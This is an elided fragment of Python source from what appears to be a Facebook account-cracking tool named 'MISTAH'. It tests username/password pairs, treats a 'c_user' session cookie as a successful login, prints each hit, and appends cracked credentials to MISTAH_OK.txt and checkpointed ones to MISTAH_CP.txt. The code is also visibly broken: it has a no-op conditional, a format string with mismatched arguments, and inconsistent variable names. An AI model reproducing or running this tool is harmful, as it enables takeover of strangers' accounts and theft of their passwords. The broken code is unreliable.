...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMISTAH_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMISTAH_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back MISTAH Menu ")
	    Sad_Boy()
...
class __xxx__:
	...
	"Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7"}
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MISTSH-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MISTAH_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MISTAH-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MISTAH_CP.txt' , 'a').write('%s\n' % wrt)
                        break
